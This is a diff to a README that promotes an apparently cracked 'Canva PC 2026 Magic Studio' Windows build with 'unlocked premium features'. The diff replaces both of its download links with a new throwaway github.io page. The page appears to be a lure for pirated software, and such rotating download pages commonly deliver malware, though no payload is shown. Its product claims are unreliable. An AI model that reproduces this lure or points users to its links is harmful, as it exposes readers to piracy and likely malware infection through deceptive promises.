@@ -2,7 +2,7 @@
 
 Canva PC 2026 Magic Studio is a comprehensive desktop application designed to bring the full suite of Canva's design tools directly to your Windows PC. This enhanced version offers unlocked premium features, an extensive templates pack, and magic studio capabilities for creating stunning graphics, presentations, and photo edits. Perfect for designers, marketers, and anyone looking to elevate their creative projects on a desktop environment.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -64,7 +64,7 @@ First, ensure your system meets the requirements and that your graphics drivers 
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
